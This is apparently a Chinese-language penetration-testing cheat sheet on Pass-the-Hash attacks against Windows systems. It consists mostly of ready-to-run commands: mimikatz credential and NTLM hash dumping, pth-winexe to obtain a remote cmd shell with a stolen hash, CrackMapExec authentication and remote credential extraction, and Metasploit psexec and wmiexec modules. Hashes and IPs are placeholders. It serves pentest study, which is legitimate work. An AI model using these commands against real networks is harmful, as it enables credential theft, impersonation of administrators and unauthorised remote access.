---
description: 基于NTLM认证 / 不需要知道明文密码 / 较旧的且使用NTLM协议的系统
---

# ✔️ 哈希传递 - Pass The Hash

## 先决条件

* 需要找到目标用户账户的NTLM哈希
* 目标域名
* 目标系统必须支持SMB / WMI / RPC 等远程认证协议

## 具体实现

### 技术原理

* 利用已知哈希值来进行身份验证，不需要知道账户的明文密码

## 常用工具

### mimikatz.exe

```powershell
mimikatz.exe
# 权限提升
privilege::debug
# 获取详细的用户凭证信息
sekurlsa::logonpasswords full
# 列出当前用户的凭据
lsadump::lsa /patch
# 获取DC上的所有域用户的NTLM哈希
sekurlsa::msv
# 执行，以允许在目标域中以administrator的身份使用NTLM哈希来进行身份验证
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:123CDVEE.....NDFE6654GDS
# 使用例如pth-winexe之类的的工具执行自定义的程序（如cmd.exe可获得一个目标上的shell）
```

### pth-winexe

* 当找到了目标账户的NTLM哈希之后，可以将其当成密码来使用，绕过输入明文密码来进行身份验证，从而获取到shell：

```bash
# pth-winexe -U [域名/用户名]%[hash] //[目标IP] cmd.exe
pth-winexe -U Administrator%00000000000000000000000000000000:123CDVEE.....NDFE6654GDS //192.168.xxx.xxx cmd
```

### Impacket

* 几个常用脚本，按实际情况在该工具的/examples目录中选择合适脚本：

<figure><img src="../../.gitbook/assets/2 (1) (1).png" alt=""><figcaption></figcaption></figure>

### Crackmapexec

```bash
# 使用NTLM哈希进行身份验证
crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD
# 在域环境中使用NTLM哈希进行身份验证
crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD -d target.com
# 列出活动会话
crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --sessions
# 利用NTLM哈希来获取TGT票据
crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --kerberos
# 利用NTLM哈希直接使用mimikatz提取凭据
crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --mimikatz
# 仅以smb模块举例，还有其他模块
```



### Metasploit

```bash
# psexec模块
use exploit/windows/smb/psexec
# wmiexec模块
use auxiliary/admin/smb/wmiexec
# smb_login模块
use auxiliary/scanner/smb/smb_login
# smbexec模块
use exploit/windows/smb/smbexec
```

{% hint style="info" %}
哈希传递攻击分为针对本地用户账户和域用户账户，通过抓取目标用户的NTLM哈希来绕过明文密码登录，其本质就是冒充特定的用户账户。
{% endhint %}
